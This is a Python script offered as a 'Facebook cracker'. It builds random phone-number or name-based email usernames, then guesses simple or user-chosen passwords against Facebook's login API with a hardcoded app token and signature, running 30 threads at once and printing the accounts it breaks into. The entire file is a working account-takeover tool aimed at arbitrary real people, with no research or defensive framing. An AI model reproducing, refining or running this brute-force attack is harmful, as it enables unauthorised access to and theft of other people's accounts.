#Coded by DulLah (fb.me/dulahz)

import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ] 

         CREATOR ARMAN.CYBERY




     / \     { _____}      / \
   /  |  \___/*******\___/  |  \
  (   I  /   ~   '   ~   \  I   )
   \  |  |   0       0   |  |  /
     \   |       A       |   /
       \__    _______    __/
          \_____________/
    _-------*         *-------_
   /  /---      A.R       ---\  \
 /  /     (    System   )     \  \
{  (     (     Cracker   )     )  }
 \  \    |               |    /  /
   \  \  |               |  /  /
    **** |               | ****
   //|\\  \_____________/  //|\\
   *         '*** ***'         *
  ***.       .*** ***.       .***
  '*************' '*************'
  Please write the 5 digit code. It should not be more than or less than 5 numbers. For example: 62877
  ''')
  kode=str(input('  5 digit code: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Please write the amount of accounts that you want to crack. for example: 500
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Arman started cracking. Process is running please wait :)
  To stop process press ctrl+z :)''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]  
         CREATOR ARMAN.CYBERY
         
     / \     { _____}      / \
   /  |  \___/*******\___/  |  \
  (   I  /   ~   '   ~   \  I   )
   \  |  |   0       0   |  |  /
     \   |       A       |   /
       \__    _______    __/
          \_____________/
    _-------*         *-------_
   /  /---      A.R       ---\  \
 /  /     (    System   )     \  \
{  (     (     Cracker   )     )  }
 \  \    |               |    /  /
   \  \  |               |  /  /
    **** |               | ****
   //|\\  \_____________/  //|\\
   *         '*** ***'         *
  ***.       .*** ***.       .***
  '*************' '*************'
         
 Please write the name for example: ahmad
  ''')
  nama=input('  Name: ')
  domain=input('''
  Please write the domain [G]mail, [Y]ahoo, [H]otmail
  Domain (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Write the amount of accounts for example: 500
  Accounts: '''))
  setpw=input('''
  Set the password for example: ahmad123,ahmad12345
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def pilih():
  print('''
  1. Crack number
  2. crack email
  ''')
  pil=int(input('  Please choose one?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error kaka , silahkan coba lagi yahh.')
